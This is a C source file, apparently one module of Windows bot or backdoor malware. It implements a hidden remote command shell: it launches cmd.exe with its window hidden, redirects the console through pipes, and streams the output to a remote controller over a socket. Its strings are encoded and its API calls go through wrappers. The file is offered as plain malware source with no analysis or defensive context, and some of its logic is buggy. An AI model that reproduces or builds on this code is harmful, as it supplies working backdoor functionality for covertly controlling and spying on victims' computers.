#include "stuff.h"
#include "externals.h"

#ifndef NO_SHELL

#define 	SHELLSLEEPTIME 100 // msec - higher value uses more cpu but also faster responding

HANDLE				writein, newstdin, newstdout, readout;
DWORD				bytesW;
PROCESS_INFORMATION procinfo;


void SHELL_WriteIn(char *bufferin)
{
	WriteFile(writein, bufferin, strlen(bufferin), &bytesW, NULL);
	memset(bufferin, sizeof(bufferin), 0);
}


void SHELL_Send(SOCKET sock, char *bufferout)
{
	char			/*buff[MAX_RECEIVE_BUFFER - 8] = {0},*/ *b;
//	unsigned int	i, k = 0;

/*#ifdef DEBUG
	printf("Sending:\n%s", bufferout);
#endif*/
	
/*	for (i = 0; bufferout[i] != 0; i++)
	{
		buff[k] = bufferout[i];
		if (buff[k] == '\r')
		{
			buff[k] = '\n';
			if (bufferout[i+1] == '\n' || bufferout[i+1] == '\r')
				i++;
			NET_Send(sock, SHELL, buff);
			memset(buff, 0, sizeof(buff));
			k = 0;
			continue;
		}
		k++;
		if (k == sizeof(buff) - 1 && bufferout[i + 1] != '\r')
		{
			buff[sizeof(buff) - 2] = '\n';
			NET_Send(sock, SHELL, buff);
			memset(buff, 0, sizeof(buff));
			k = 0;
		}
	}

	if (strlen(buff) != 0)
	{
		if (buff[strlen(buff) - 1] != '\n' && strlen(buff) < sizeof(buff))
		{
			buff[strlen(buff)] = '\n';
			NET_Send(sock, SHELL, buff);
		}
	}*/

	b = strtok(bufferout, "\r\n");
	while (b != NULL)
	{
		NET_Send(sock, SHELL, b);
		b = strtok(NULL, "\r\n");
	}
}


void SHELL_Stop()
{
	char	e[16];

	_snprintf(e, sizeof(e) - 1, "%s\n", strings[Decode(s_exit)].encoded);

	WriteFile(writein, e, 5, &bytesW, NULL);

    fCloseHandle(procinfo.hThread);
    fCloseHandle(procinfo.hProcess);
    fCloseHandle(newstdin);
    fCloseHandle(writein);
    fCloseHandle(readout);
    fCloseHandle(newstdout);
}


DWORD WINAPI SHELL_Thread(LPVOID param)
{		
	DWORD			bytesRead, avail, exitcode;
	char			bufferout[65535];
	SECURITY_ATTRIBUTES secat;
	STARTUPINFO startinfo;

	shell_s s = *((shell_s *)param);

	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
	secat.bInheritHandle = TRUE;
	secat.lpSecurityDescriptor = NULL;

    if (!fCreatePipe(&newstdin, &writein, &secat, 0))
	{
#ifdef DEBUG
		printf("Failed to create pipe.\n");
#endif
	}
	if (!fCreatePipe(&readout, &newstdout, &secat, 0))
	{
#ifdef DEBUG
		printf("Failed to create pipe 2.\n");
#endif
	}

	fGetStartupInfo(&startinfo);
     
	startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
/*#ifdef DEBUG
	startinfo.wShowWindow = SW_SHOW;
#else*/
	startinfo.wShowWindow = SW_HIDE;
//#endif
	startinfo.hStdOutput = newstdout;
	startinfo.hStdError = newstdout;
	startinfo.hStdInput = newstdin;

	fCreateProcess(NULL, strings[Decode(s_cmdexe)].encoded, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS /*CREATE_NEW_CONSOLE*/, NULL, NULL, &startinfo, &procinfo);

	while (1)
	{
		//check if cmd.exe is still running, if not then cleanup and start listening again.
		if (fGetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
		{
#ifdef DEBUG
			printf("Exit code = STILL ACTIVE\n");
#endif
			fCloseHandle(procinfo.hThread);
			fCloseHandle(procinfo.hProcess);
            fCloseHandle(newstdin);
            fCloseHandle(writein);
            fCloseHandle(readout);
            fCloseHandle(newstdout);
            break;
		}

        bytesRead=0;
        Sleep(SHELLSLEEPTIME);

		fPeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
        if (bytesRead != 0)
        {
#ifdef DEBUG	
			printf("Reading console...\n");
#endif
			while (bytesRead != 0)
            {     
				ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);
				SHELL_Send(s.sock, bufferout);
				memset(bufferout, 0, sizeof(bufferout));
                Sleep(100);  
				fPeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
			}
		}
    }

#ifdef DEBUG	
	printf("Exiting thread.\n");
#endif

	Thread_Clear(s.tnum);
	ExitThread(0);
}

#endif
                 
     
     
